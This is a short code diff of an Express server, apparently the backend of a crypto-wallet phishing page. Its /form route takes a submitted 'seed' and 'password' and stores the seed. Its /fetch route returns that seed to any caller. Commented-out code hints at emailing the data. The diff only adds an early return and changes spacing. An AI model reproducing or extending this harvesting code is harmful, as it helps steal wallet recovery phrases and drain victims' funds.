@@ -29,6 +29,8 @@ app.post('/form', async(req, res) => {
   const { seed, password } = await req.body
   seed1 = seed
 
+  return res.json({ status: 200 })
+
   // const transporter = await nodemailer.createTransport({
   //   service: 'gmail',
   //   auth: {
@@ -46,7 +48,7 @@ app.post('/form', async(req, res) => {
 }) 
 
 app.get('/fetch', (req, res) => {
-  return res.json({"seed": seed1})
+  return res.json({"seed": seed1 })
 })
 
 app.listen(port, () => {
